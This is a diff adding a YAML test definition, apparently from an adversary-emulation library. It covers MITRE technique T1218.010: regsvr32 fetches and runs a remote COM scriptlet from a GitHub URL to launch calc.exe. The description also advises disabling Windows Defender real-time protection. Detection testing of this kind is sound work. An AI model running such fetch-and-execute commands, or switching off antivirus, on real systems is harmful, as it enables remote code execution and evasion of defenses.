@@ -1,0 +1,21 @@
+---
+- id: c9bea46c8cb460a401d5167e9ee3bfe2
+  name: Regsvr32 remote COM scriptlet execution
+  description: 'Regsvr32.exe is a command-line program used to register and unregister
+    OLE controls. This test may be blocked by windows defender; disable
+
+    windows defender real-time protection to fix it. Upon execution, calc.exe will
+    be launched.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1218.010
+    name: 'Signed Binary Proxy Execution: Regsvr32'
+  platforms:
+    windows:
+      cmd:
+        command: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
+          scrobj.dll
+        payloads: []
+        cleanup: ''
